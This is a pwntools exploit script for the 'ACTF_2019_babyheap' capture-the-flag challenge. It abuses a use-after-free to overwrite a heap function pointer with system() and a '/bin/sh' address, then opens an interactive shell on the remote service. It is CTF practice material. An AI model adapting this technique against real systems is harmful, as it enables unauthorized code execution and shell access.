'''
@Author       : 白银
@Date         : 2023-03-09 18:39:44
@LastEditors  : 白银
@LastEditTime : 2023-03-09 19:53:07
@FilePath     : /pwn/ACTF_2019_babyheap.py
@Description  : UAF from buu
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './ACTF_2019_babyheap'
elf = ELF(pwnfile)

state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("node4.buuoj.cn", 27420)
    # libc = ELF('/home/jack/Desktop/libc.so.6')

    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/x64_libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/x86_libc.so.6')
else:
    io = process(pwnfile)

    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()


def create(size, payload):
    io.sendlineafter("Your choice: ", '1')
    io.sendlineafter("Please input size: \n", str(size))
    io.sendafter("Please input content: \n", payload)


def delete(index):
    io.sendlineafter("Your choice: ", '2')
    io.sendlineafter("Please input list index: \n", str(index))


def oupt(index):
    io.sendlineafter("Your choice: ", '3')
    io.sendlineafter("Please input list index: \n", str(index))


create(0x21, 'index0')
create(0x21, 'index1')
delete(0)
delete(1)

create(0x10, p64(0x602010) + p64(elf.symbols["system"])) # 0x602010是/bin/sh开始的地方，ida找
oupt(0)

io.interactive()
